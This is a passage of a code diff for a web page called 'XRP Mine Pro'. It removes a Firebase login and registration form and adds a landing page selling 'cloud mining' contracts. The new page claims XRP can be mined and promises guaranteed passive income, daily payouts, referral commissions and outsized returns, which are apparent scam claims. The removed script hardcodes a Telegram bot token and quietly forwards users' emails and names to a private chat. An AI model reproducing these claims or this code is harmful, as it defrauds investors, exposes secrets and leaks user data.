@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XRP Mine Pro - Auth Center (Login/Register) - Firebase Ready</title>
+    <title>XRP Mine Pro | Premium Cloud Mining Platform</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     
     <style>
-        /* Shared Styles from Main Theme */
+        /* 🎨 BASE CSS STYLES */
         :root {
-            --primary-color: #03a9f4; /* Blue - Login/Active */
-            --secondary-color: #ff9800; /* Orange/Gold - Register/Highlight */
-            --accent-color: #4CAF50; /* Green - Register Button/Success */
-            --error-color: #f44336; /* Red - Error Messages */
+            --primary-color: #03a9f4; /* Blue - Main Highlight */
+            --secondary-color: #ff9800; /* Orange/Gold - Register/CTA */
+            --accent-color: #4CAF50; /* Green - Mining Highlight/Success */
             --card-bg: #212121; 
+            --bg-color: #121212;
+            --text-color: #eeeeee;
             --border-color: #333333;
         }
 
@@ -23,492 +24,440 @@
             font-family: 'Inter', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #121212;
-            color: #eeeeee;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             line-height: 1.6;
         }
-        
-        a { color: var(--primary-color); text-decoration: none; transition: color 0.3s; }
-        a:hover { color: #81d4fa; }
 
-        .auth-container { 
-            background-color: var(--card-bg); 
-            padding: 20px 35px 40px;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
-            width: 100%;
-            max-width: 480px;
-            border-top: 5px solid var(--primary-color); 
+        /* ------------------ Header Styles ------------------ */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 5%;
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.8em;
+            font-weight: 800;
+            color: var(--primary-color);
+        }
+
+        .cta-btn {
+            background-color: var(--secondary-color);
+            color: var(--bg-color) !important;
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        
+        /* ------------------ Hero Section Styles ------------------ */
+        .hero {
+            padding: 100px 5%; 
             text-align: center;
-            transition: border-top-color 0.3s;
+            position: relative; 
+            z-index: 1; 
+            background: radial-gradient(circle at top, #1a1a1a 0%, var(--bg-color) 70%);
         }
 
-        .logo { font-size: 2em; font-weight: 800; color: var(--secondary-color); margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid var(--border-color); }
-        .tab-selector { display: flex; justify-content: center; margin-bottom: 30px; }
-        .tab-btn { flex-grow: 1; padding: 15px 0; font-size: 1.2em; font-weight: 700; background: none; border: none; color: #9e9e9e; cursor: pointer; border-bottom: 3px solid transparent; transition: color 0.3s, border-bottom 0.3s; }
-        .form-content { display: none; padding-top: 10px; }
-        .form-content.active { display: block; }
+        .hero h1 { font-size: 3.5em; font-weight: 800; margin-bottom: 20px; }
+        .hero .highlight { color: var(--accent-color); }
+        .cta-primary {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: var(--bg-color);
+            padding: 15px 30px;
+            font-size: 1.1em;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 6px;
+        }
 
-        /* Form Field Styles */
-        .input-group { margin-bottom: 20px; text-align: left; }
-        .input-group label { display: block; margin-bottom: 8px; color: #bbbbbb; font-weight: 600; }
-        .input-group input { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); background-color: #1a1a1a; color: #eeeeee; font-size: 1em; box-sizing: border-box; transition: border-color 0.3s, box-shadow 0.3s; }
-        .input-group input:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(3, 169, 244, 0.2); outline: none; }
+        .stats {
+            margin-top: 50px;
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            font-size: 1.1em;
+            color: #999999;
+        }
 
-        /* Button Styles */
-        .submit-btn { color: white; padding: 15px 40px; border: none; border-radius: 30px; font-size: 1.1em; font-weight: 700; cursor: pointer; width: 100%; margin-top: 20px; transition: background-color 0.3s, transform 0.2s; }
-        #login-form .submit-btn { background-color: var(--primary-color); box-shadow: 0 4px 10px rgba(3, 169, 244, 0.4); }
-        #register-form .submit-btn { background-color: var(--accent-color); box-shadow: 0 4px 10px rgba(76, 175, 80, 0.4); }
-        .submit-btn:hover { transform: translateY(-1px); }
+        /* ------------------ XRP FLOATING ANIMATION ------------------ */
+        .xrp-animation-area {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; 
+            z-index: 0;
+            opacity: 0.08;
+        }
+
+        .xrp-coins {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            padding: 0; margin: 0; list-style: none;
+        }
+
+        .xrp-coins li {
+            position: absolute; display: block; width: 20px; height: 20px;
+            animation: animate 20s linear infinite; 
+            bottom: -150px; color: var(--primary-color);
+        }
+
+        .xrp-coins li i { font-size: 3em; }
+
+        .xrp-coins li:nth-child(1) { left: 25%; width: 80px; animation-delay: 0s; animation-duration: 15s; }
+        .xrp-coins li:nth-child(2) { left: 10%; width: 20px; animation-delay: 2s; animation-duration: 12s; }
+        .xrp-coins li:nth-child(3) { left: 70%; width: 20px; animation-delay: 4s; animation-duration: 18s; }
+        .xrp-coins li:nth-child(4) { left: 40%; width: 60px; animation-delay: 0s; animation-duration: 10s; }
+        .xrp-coins li:nth-child(5) { left: 85%; width: 40px; animation-delay: 3s; animation-duration: 20s; }
+
+        @keyframes animate {
+            0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0.5; }
+            50% { transform: translateY(-50vh) rotate(180deg) scale(1.1); }
+            100% { transform: translateY(-100vh) rotate(360deg) scale(1); opacity: 0; }
+        }
         
-        /* Reset Button Style */
-        .reset-btn {
-            background-color: var(--secondary-color); /* Orange for Reset */
-            box-shadow: 0 4px 10px rgba(255, 152, 0, 0.4);
-            margin-top: 10px;
+        /* ------------------ General Section Styles ------------------ */
+        .section {
+            padding: 80px 5%;
+            text-align: center;
+            background-color: var(--bg-color);
+            border-top: 1px solid var(--border-color);
         }
-        .reset-btn:hover { background-color: #fb8c00; }
 
-
-        /* --- VERIFICATION/MESSAGE STYLES --- */
-        .verification-message, .reset-password-form {
-            background-color: #1e1e1e; 
-            padding: 30px;
-            border-radius: 8px;
-            border: 2px solid var(--secondary-color); 
-            margin-top: 20px;
-            display: none;
-            text-align: left;
-        }
-        .verification-message h4, .reset-password-form h4 {
-            color: var(--secondary-color); 
-            font-size: 1.6em;
-            margin-top: 0;
+        .section h2 {
+            font-size: 2.2em;
+            color: var(--primary-color);
+            margin-bottom: 50px;
             font-weight: 700;
         }
         
-        /* Resend Button Style */
-        .resend-btn {
-            background-color: var(--primary-color);
+        /* ------------------ Plans Grid Styles ------------------ */
+        .plan-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .plan-card {
+            background-color: #2c2c2c; 
+            border-radius: 15px;
+            padding: 40px 30px;
+            width: 320px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+            border: 2px solid #424242;
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative; 
+            text-align: center;
+        }
+        .plan-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7);
+        }
+
+        .plan-card.gold-highlight {
+            border: 3px solid var(--secondary-color); 
+            background: linear-gradient(145deg, #2c2c2c, #3a3a3a);
+            box-shadow: 0 10px 40px rgba(255, 152, 0, 0.4);
+        }
+        
+        .plan-card.free-plan {
+            border: 3px solid var(--accent-color); 
+            background: linear-gradient(145deg, #1f2b1f, #2c382c); 
+            box-shadow: 0 10px 40px rgba(76, 175, 80, 0.4);
+        }
+        
+        .plan-card h3 {
+            color: var(--primary-color);
+            font-size: 2em;
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+        .plan-card.free-plan h3 {
+            color: var(--accent-color);
+        }
+
+
+        .plan-card p {
+            font-size: 1.1em;
+            margin: 12px 0;
+            color: #cccccc;
+        }
+        
+        .plan-card button {
+            background-color: var(--secondary-color);
+            padding: 14px 40px;
+            border-radius: 30px;
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-top: 20px;
+            box-shadow: 0 4px 10px rgba(255, 152, 0, 0.4);
+        }
+        .plan-card button:hover {
+            transform: translateY(-1px);
+        }
+        
+        .plan-card.free-plan button {
+             background-color: var(--accent-color);
+             box-shadow: 0 4px 10px rgba(76, 175, 80, 0.4);
+        }
+        .plan-card button:disabled {
+            background-color: #555 !important;
+            box-shadow: none !important;
+            cursor: not-allowed;
+        }
+        
+        /* ------------------ (නව) Activated Badge CSS ------------------ */
+        /* මෙය dashboard.html වෙතින් ගෙන ආවකි. 😄.html එකට අලුතින් එක් කරන ලදී. */
+        .activated-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background-color: var(--accent-color);
             color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-            display: inline-block;
-            margin-top: 15px;
-            transition: background-color 0.3s;
+            padding: 5px 12px;
+            border-radius: 5px;
+            font-weight: 700;
+            font-size: 0.9em;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
         }
-        .resend-btn:hover { background-color: #0288d1; }
 
-        /* Feedback and Error Message Styling */
-        .feedback-message {
-            margin-top: 15px;
-            font-weight: 600;
-            padding: 10px;
-            border-radius: 4px;
-            text-align: center; /* Center feedback messages */
+
+        /* ------------------ Features Grid Styles ------------------ */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        .feedback-success { color: var(--accent-color); background-color: rgba(76, 175, 80, 0.1); border: 1px solid var(--accent-color); }
-        .feedback-error { color: var(--error-color); background-color: rgba(244, 67, 54, 0.1); border: 1px solid var(--error-color); }
-        .feedback-pending { color: var(--primary-color); }
 
+        .card { 
+            background-color: var(--card-bg);
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid #2f2f2f;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, border-color 0.3s;
+            text-align: center;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--secondary-color);
+        }
+
+        .card i {
+            font-size: 2.5em;
+            color: var(--accent-color);
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .card h3 {
+            font-size: 1.4em;
+            margin-top: 0;
+            color: var(--text-color);
+        }
+
+        /* ------------------ Testimonial Styles ------------------ */
+        .testimonial-section {
+             background-color: #1a1a1a;
+        }
+        .testimonial-card {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px;
+            background-color: var(--card-bg);
+            border-radius: 10px;
+            border-left: 5px solid var(--primary-color);
+            text-align: left;
+        }
+        .quote {
+            font-style: italic;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        .author {
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+        .txn-id {
+            display: block;
+            font-size: 0.9em;
+            color: #888;
+            margin-top: 5px;
+        }
+
+
+        /* ------------------ Footer Styles ------------------ */
+        footer {
+            padding: 30px 5%;
+            background-color: var(--bg-color);
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: #888888;
+            font-size: 0.9em;
+        }
+
+        footer .legal-links a {
+            color: #888888;
+            text-decoration: none;
+            margin: 0 15px;
+            transition: color 0.3s;
+        }
+        footer .legal-links a:hover { color: var(--primary-color); }
+        footer div a { margin: 0 10px; font-size: 1.4em; }
+
+        /* ------------------ Media Queries (Responsive) ------------------ */
+        @media (max-width: 1100px) {
+            .grid {
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+            }
+            .plan-container {
+                gap: 20px; /* Reduce gap on smaller screens */
+            }
+        }
+        @media (max-width: 768px) {
+            header { flex-direction: column; padding: 15px 5%; }
+            .hero h1 { font-size: 2.5em; }
+            .stats { flex-direction: column; gap: 15px; }
+            .plan-card { width: 90%; }
+            header .cta-btn { margin-top: 10px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="auth-container">
-        <div class="logo">XRP MINE PRO</div>
-        
-        <div class="tab-selector">
-            <button class="tab-btn active" onclick="showForm('login')"><i class="fas fa-sign-in-alt"></i> Log In</button>
-            <button class="tab-btn" onclick="showForm('register')"><i class="fas fa-user-plus"></i> Register</button>
-        </div>
-
-        <div id="login-form" class="form-content active">
-            <form id="log-form" onsubmit="event.preventDefault(); handleLogin();" method="POST">
-                <div class="input-group">
-                    <label for="login-email"><i class="fas fa-envelope"></i> Email Address</label>
-                    <input type="email" id="login-email" name="email" placeholder="Enter your email" required>
-                </div>
-                <div class="input-group">
-                    <label for="login-password"><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
-                </div>
-                <button type="submit" class="submit-btn">Secure Log In</button>
-                <div id="login-feedback" class="feedback-message" style="display: none;"></div>
-                <p style="margin-top: 15px; font-size: 0.9em;">
-                    <a href="#" onclick="event.preventDefault(); showResetPasswordForm();">Forgot Password?</a>
-                </p>
-            </form>
-            
-            <div id="reset-form" class="reset-password-form">
-                <h4><i class="fas fa-key"></i> Reset Password</h4>
-                <p style="color: #cccccc; margin-bottom: 20px; font-size: 0.95em;">Enter your email address to receive a password reset link.</p>
-                
-                <form onsubmit="event.preventDefault(); handlePasswordReset();">
-                    <div class="input-group">
-                        <label for="reset-email"><i class="fas fa-envelope"></i> Account Email</label>
-                        <input type="email" id="reset-email" name="reset_email" placeholder="Enter email for reset link" required>
-                    </div>
-                    <button type="submit" class="submit-btn reset-btn">Send Reset Link</button>
-                    <button type="button" class="submit-btn" style="background-color: #555; margin-top: 10px;" onclick="hideResetPasswordForm()">Cancel</button>
-                    <div id="reset-feedback" class="feedback-message" style="display: none;"></div>
-                </form>
-            </div>
-            
-        </div>
-        
-        <div id="register-form" class="form-content">
-            <form id="reg-form" onsubmit="event.preventDefault(); handleRegistration();" method="POST">
-                <div class="input-group">
-                    <label for="reg-username"><i class="fas fa-user"></i> Username</label>
-                    <input type="text" id="reg-username" name="username" placeholder="Choose a username" required>
-                </div>
-                <div class="input-group">
-                    <label for="reg-email"><i class="fas fa-envelope"></i> Email Address</label>
-                    <input type="email" id="reg-email" name="email" placeholder="Your current email" required>
-                </div>
-                <div class="input-group">
-                    <label for="reg-password"><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" id="reg-password" name="password" placeholder="Minimum 8 characters" required>
-                </div>
-                <div class="input-group">
-                    <label for="reg-confirm-password"><i class="fas fa-check-circle"></i> Confirm Password</label>
-                    <input type="password" id="reg-confirm-password" name="confirm_password" placeholder="Re-enter your password" required>
-                </div>
-                
-                <button type="submit" class="submit-btn">Create Account</button>
-                <div id="register-feedback" class="feedback-message" style="display: none;"></div>
-                <p style="margin-top: 15px; font-size: 0.9em; color: #bbbbbb;">By clicking Register, you agree to our Terms.</p>
-            </form>
-
-            <div id="verification-msg" class="verification-message">
-                <h4><i class="fas fa-paper-plane"></i> Verification Required!</h4>
-                <p style="color: #cccccc;">We've successfully created your account. A verification link has been sent to your email address.</p>
-                <p style="font-size: 0.9em; font-weight: 600;">Please check your inbox (and spam folder) to activate your account.</p>
-                <button class="resend-btn" onclick="resendVerificationEmail(event)">
-                    <i class="fas fa-redo"></i> Resend Verification Link
-                </button>
-                <div id="resend-feedback" class="feedback-message" style="display: none;"></div>
-            </div>
-        </div>
+    <div class="xrp-animation-area">
+        <ul class="xrp-coins">
+            <li><i class="fa-brands fa-xrp"></i></li>
+            <li><i class="fa-brands fa-xrp"></i></li>
+            <li><i class="fa-brands fa-xrp"></i></li>
+            <li><i class="fa-brands fa-xrp"></i></li>
+            <li><i class="fa-brands fa-xrp"></i></li>
+        </ul>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <header>
+        <div class="logo">XRP Mine Pro</div>
+        <a href="register.html" class="cta-btn">Login / Register</a> 
+    </header>
+
+    <section class="hero">
+        <h1>Start Your <span class="highlight">XRP Mining</span> Journey Today.</h1>
+        <p>Premium cloud mining with high-speed performance, daily payouts, and a 10% commission referral system.</p>
+        <a href="register.html" class="cta-primary">Start Mining Now</a>
+        <div class="stats">
+            <div><i class="fas fa-users"></i> 50,000+ Users Globally</div>
+            <div><i class="fas fa-chart-line"></i> Guaranteed Uptime</div>
+            <div><i class="fas fa-shield-alt"></i> Secure & Protected</div>
+        </div>
+    </section>
+
+    <section id="plans" class="section">
+        <h2>SELECT YOUR CONTRACT</h2>
+        <div class="plan-container">
+            
+            <div class="plan-card free-plan" id="free-plan-card">
+                <h3><i class="fas fa-gift"></i> FREE STARTER (Trial)</h3>
+                <p>Hash Rate: **50.00 MH/s**</p> 
+                <p>Price: **$0.00 (FREE)**</p>
+                <p>Duration: **15 Days Trial**</p>
+                <p style="font-size: 0.9em; color: #ff9800; font-weight: 600;">Full Earning: **15.00 XRP**</p> 
+                <button id="free-plan-btn" onclick="document.location.href='register.html'">ACTIVATE FREE PLAN <i class="fas fa-rocket"></i></button>
+            </div>
+            
+            <div class="plan-card">
+                <h3>BRONZE (1 Month)</h3>
+                <p>Hash Rate: **150 MH/s**</p>
+                <p>Price: $10</p>
+                <p>Duration: 30 Days</p>
+                <p style="font-size: 0.9em; color: var(--secondary-color); font-weight: 600;">Full Earning: **35.00 XRP**</p> 
+                <button onclick="document.location.href='register.html'">PURCHASE <i class="fas fa-bolt"></i></button>
+            </div>
+            
+            <div class="plan-card">
+                <h3>SILVER (2 Months)</h3>
+                <p>Hash Rate: **250 MH/s**</p>
+                <p>Price: $50</p>
+                <p>Duration: 60 Days</p>
+                <p style="font-size: 0.9em; color: var(--secondary-color); font-weight: 600;">Full Earning: **120.00 XRP**</p>
+                <button onclick="document.location.href='register.html'">PURCHASE <i class="fas fa-bolt"></i></button>
+            </div>
+            
+            <div class="plan-card gold-highlight">
+                <h3>ELITE GOLD (3 Months)</h3>
+                <p>Hash Rate: **500 MH/s**</p> 
+                <p>Price: $100</p>
+                <p>Duration: 90 Days</p>
+                <p style="font-size: 0.9em; color: var(--secondary-color); font-weight: 600;">Full Earning: **500.00 XRP**</p>
+                <button onclick="document.location.href='register.html'">PURCHASE <i class="fas fa-fire"></i></button>
+            </div>
+        </div>
+    </section>
+    <section id="features" class="section" style="background-color: #1a1a1a;">
+        <h2>Why Choose XRP Mine Pro?</h2>
+        <div class="grid">
+            
+            <div class="card" style="text-align: left;">
+                <i class="fas fa-bolt"></i>
+                <h3>High-Speed Hashing</h3>
+                <p>We provide the latest generation of mining hardware for maximum XRP output and efficiency.</p>
+            </div>
+            
+            <div class="card" style="text-align: left;">
+                <i class="fas fa-handshake"></i>
+                <h3>10% Lifetime Commission</h3>
+                <p>Refer your friends and earn a substantial 10% commission on all their plan purchases. Passive income guaranteed!</p>
+            </div>
+            
+            <div class="card" style="text-align: left;">
+                <i class="fas fa-wallet"></i>
+                <h3>Instant Daily Payouts</h3>
+                <p>Withdraw your mined XRP directly to your wallet daily. No waiting period, quick and reliable payouts.</p>
+            </div>
+            
+            <div class="card" style="text-align: left;">
+                <i class="fas fa-headset"></i>
+                <h3>24/7 Priority Support</h3>
+                <p>Our dedicated team is always ready to assist you with any technical or account-related questions.</p>
+            </div>
+        </div>
+    </section>
     
-    <script>
-        // =========================================================================================
-        // 1. ⚙️ FIREBASE CONFIGURATION (මෙය ඔබගේ සැබෑ තොරතුරු සමඟ ප්‍රතිස්ථාපනය කරන්න)
-        // =========================================================================================
-        const firebaseConfig = {
-            apiKey: "AIzaSyBsTIzaJtaGiAfv4a69o80f0QvKiq6lFj4", 
-            authDomain: "xrp-mine-pro.firebaseapp.com",
-            projectId: "xrp-mine-pro",
-            storageBucket: "xrp-mine-pro.appspot.com",
-            messagingSenderId: "1234567890",
-            appId: "1:1234567890:web:abcdef123456"
-        };
-        
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore(); // 🟢 Firestore initialize කිරීම
-        
-        // =========================================================================================
-        // 2. 🤖 TELEGRAM BOT CONFIGURATION (මෙම තොරතුරු ඔබගේ Bot වෙත ලැබෙන බැවින් අනාරක්ෂිතය!)
-        // =========================================================================================
-        const TELEGRAM_BOT_TOKEN = "8441096313:AAGtOgFrHFk3ROaRKZoYQ19prswgRvqkU1Y"; 
-        const TELEGRAM_CHAT_ID   = "8344580966"; 
-        // =========================================================================================
-        
-
-        // --- Telegram Notification Function ---
-        function sendTelegramNotification(eventType, details) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error("Telegram Token or Chat ID is missing. Notification skipped.");
-                return;
-            }
-
-            let messageText = `🚨 <b>NEW ${eventType.toUpperCase()} ALERT!</b> 🚨\n\n`;
-            
-            // Details එකතු කිරීම
-            for (const [key, value] of Object.entries(details)) {
-                messageText += `<b>${key}:</b> ${value}\n`;
-            }
-            
-            // Client-side IP ගැනීම අපහසු බැවින්, ඒ වෙනුවට කාලය දමමු.
-            messageText += `\nTime: ${new Date().toLocaleString()}`; 
-
-            // API URL එක
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            // Fetch Request එක යැවීම
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText,
-                    parse_mode: 'HTML' 
-                }),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Telegram notification failed:', response.status, response.statusText);
-                } else {
-                    console.log('Telegram notification sent successfully.');
-                }
-            })
-            .catch(error => {
-                console.error('Error sending Telegram message:', error);
-            });
-        }
-        
-        // --- Utility function to display feedback messages ---
-        function displayFeedback(elementId, message, type = 'pending') {
-            const element = document.getElementById(elementId);
-            element.textContent = message;
-            element.style.display = 'block';
-            element.className = 'feedback-message'; 
-            
-            if (type === 'success') {
-                element.classList.add('feedback-success');
-            } else if (type === 'error') {
-                element.classList.add('feedback-error');
-            } else {
-                element.classList.add('feedback-pending');
-            }
-        }
-
-        // --- Password Reset Functions ---
-        function showResetPasswordForm() {
-            document.getElementById('log-form').style.display = 'none';
-            document.getElementById('reset-form').style.display = 'block';
-            document.getElementById('login-feedback').style.display = 'none';
-            document.getElementById('reset-feedback').style.display = 'none';
-        }
-
-        function hideResetPasswordForm() {
-            document.getElementById('log-form').style.display = 'block';
-            document.getElementById('reset-form').style.display = 'none';
-            document.getElementById('reset-feedback').style.display = 'none';
-        }
-
-        async function handlePasswordReset() {
-            const email = document.getElementById('reset-email').value;
-            displayFeedback('reset-feedback', 'Sending reset link...', 'pending');
-
-            try {
-                await auth.sendPasswordResetEmail(email);
-                displayFeedback(
-                    'reset-feedback', 
-                    'Password reset link sent to ' + email + '. Check your inbox!', 
-                    'success'
-                );
-
-            } catch (error) {
-                let errorMessage = "Failed to send reset email. Try again.";
-                
-                if (error.code === 'auth/user-not-found') {
-                     errorMessage = "Error: Account not found with that email address.";
-                } else if (error.code) {
-                    errorMessage = error.message.replace('Firebase:', '').trim(); 
-                }
-                
-                displayFeedback('reset-feedback', 'Error: ' + errorMessage, 'error');
-                console.error("Firebase Reset Error:", error);
-            }
-        }
-
-
-        // 🟢 FIREBASE REGISTER FUNCTION (Firestore Additions)
-        async function handleRegistration() {
-            const username = document.getElementById('reg-username').value;
-            const email = document.getElementById('reg-email').value;
-            const password = document.getElementById('reg-password').value;
-            const confirmPassword = document.getElementById('reg-confirm-password').value;
-            
-            displayFeedback('register-feedback', 'Creating account...', 'pending');
-
-            if (password !== confirmPassword) {
-                displayFeedback('register-feedback', 'Error: Passwords do not match!', 'error');
-                return; 
-            }
-
-            try {
-                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
-                const user = userCredential.user;
-                
-                await user.sendEmailVerification();
-                await user.updateProfile({ displayName: username }); 
-                
-                // 🟢 නව කේතය: Firestore වෙත පුද්ගලීකරණය කළ දත්ත සුරැකීම
-                await db.collection("users").doc(user.uid).set({
-                    username: username,
-                    email: email,
-                    referralCode: user.uid.substring(0, 8), // User ID එකේ මුල් අකුරු 8 Referral Code ලෙස යොදයි.
-                    balance: 0.00, 
-                    totalMined: 0.00,
-                    referrals: 0,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
-                });
-                
-                // 🟢 TELEGRAM NOTIFICATION (REGISTER)
-                sendTelegramNotification('Registration', {
-                    Username: username,
-                    Email: email,
-                    Status: 'Created, Verification Pending'
-                });
-
-                showVerificationMessage();
-                
-            } catch (error) {
-                let errorMessage = "Registration failed. Please try again.";
-                if (error.code) {
-                    errorMessage = error.message.replace('Firebase:', '').trim(); 
-                }
-                displayFeedback('register-feedback', 'Error: ' + errorMessage, 'error');
-                console.error("Firebase Registration Error:", error);
-            }
-        }
-        
-        // --- Firebase Login Function (Telegram Notification Added) ---
-        // ⚠️ ගැටලුව නිරාකරණය කිරීම සඳහා reload() ක්‍රමය මෙහි එක් කර ඇත
-        async function handleLogin() {
-            const email = document.getElementById('login-email').value;
-            const password = document.getElementById('login-password').value;
-            
-            displayFeedback('login-feedback', 'Logging in...', 'pending');
-
-            if (document.getElementById('reset-form').style.display === 'block') {
-                 hideResetPasswordForm();
-            }
-
-            try {
-                const userCredential = await auth.signInWithEmailAndPassword(email, password);
-                let user = userCredential.user;
-                
-                // 🟢 ඊමේල් සත්‍යාපන තත්ත්වය නැවුම් කිරීමට reload() භාවිතා කිරීම
-                await user.reload(); 
-                user = auth.currentUser; // යාවත්කාලීන කළ user වස්තුව නැවත ලබා ගනී
-                
-                if (!user.emailVerified) {
-                    displayFeedback(
-                        'login-feedback', 
-                        'Login failed: Your email address is not verified. Check "Register" tab to resend.', 
-                        'error'
-                    );
-                    
-                    await auth.signOut();
-                    showForm('register');
-                    showVerificationMessage(); 
-                    return;
-                }
-                
-                // 🟢 TELEGRAM NOTIFICATION (LOGIN)
-                sendTelegramNotification('Login Successful', {
-                    Username: user.displayName || 'N/A',
-                    Email: email
-                });
-                
-                displayFeedback('login-feedback', 'Login successful! Welcome, ' + user.displayName + '!', 'success');
-                // 🟢 සාර්ථකව පිවිසීමෙන් පසු dashboard.html වෙත යොමු කරයි
-                window.location.href = "dashboard.html"; 
-                
-            } catch (error) {
-                let errorMessage = "Invalid email or password.";
-                if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password') {
-                     errorMessage = "Invalid email or password.";
-                } else if (error.code) {
-                    errorMessage = error.message.replace('Firebase:', '').trim();
-                }
-                displayFeedback('login-feedback', 'Error: ' + errorMessage, 'error');
-                console.error("Firebase Login Error:", error);
-            }
-        }
-        
-        // --- Resend Verification Email Function ---
-        async function resendVerificationEmail(event) {
-            event.preventDefault();
-            const feedbackMsgId = 'resend-feedback';
-            
-            displayFeedback(feedbackMsgId, 'Sending new link...', 'pending');
-
-            const user = auth.currentUser;
-            
-            if (user) {
-                try {
-                    await user.sendEmailVerification();
-                    displayFeedback(feedbackMsgId, 'New verification email sent successfully!', 'success');
-                } catch (error) {
-                    let errorMessage = 'Failed to resend email. Try again later.';
-                    if (error.code) {
-                         errorMessage = error.message.replace('Firebase:', '').trim();
-                    }
-                    displayFeedback(feedbackMsgId, 'Error: ' + errorMessage, 'error');
-                    console.error("Resend Error:", error);
-                }
-            } else {
-                displayFeedback(feedbackMsgId, 'Error: Please log out and try registering again.', 'error');
-            }
-        }
-
-        // --- Utility Functions ---
-        function showVerificationMessage() {
-            const regForm = document.getElementById('reg-form');
-            const verificationMsg = document.getElementById('verification-msg');
-            regForm.style.display = 'none';
-            verificationMsg.style.display = 'block';
-            document.getElementById('register-feedback').style.display = 'none';
-            document.getElementById('resend-feedback').style.display = 'none';
-        }
-        
-        function showForm(formId) {
-            document.querySelectorAll('.form-content').forEach(form => { form.classList.remove('active'); });
-            document.querySelectorAll('.tab-btn').forEach(btn => { btn.classList.remove('active'); });
-            
-            if (document.getElementById('verification-msg').style.display === 'block') {
-                document.getElementById('reg-form').style.display = 'block';
-                document.getElementById('verification-msg').style.display = 'none';
-            }
-            
-            if (document.getElementById('reset-form').style.display === 'block') {
-                 hideResetPasswordForm();
-            }
-            
-            document.getElementById('login-feedback').style.display = 'none';
-            document.getElementById('register-feedback').style.display = 'none';
-
-            document.getElementById(formId + '-form').classList.add('active');
-            const activeTabButton = document.querySelector(`.tab-btn[onclick*="${formId}"]`);
-            activeTabButton.classList.add('active');
-            
-            const container = document.querySelector('.auth-container');
-            if (formId === 'login') {
-                container.style.borderTopColor = 'var(--primary-color)'; 
-                activeTabButton.style.color = 'var(--primary-color)';
-                activeTabButton.style.borderBottomColor = 'var(--primary-color)';
-            } else {
-                container.style.borderTopColor = 'var(--secondary-color)'; 
-                activeTabButton.style.color = 'var(--secondary-color)';
-                activeTabButton.style.borderBottomColor = 'var(--secondary-color)';
-            }
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            showForm('login');
-        });
-    </script>
+    <section class="section testimonial-section">
+        <h2>What Our Users Say</h2>
+        <div class="testimonial-card">
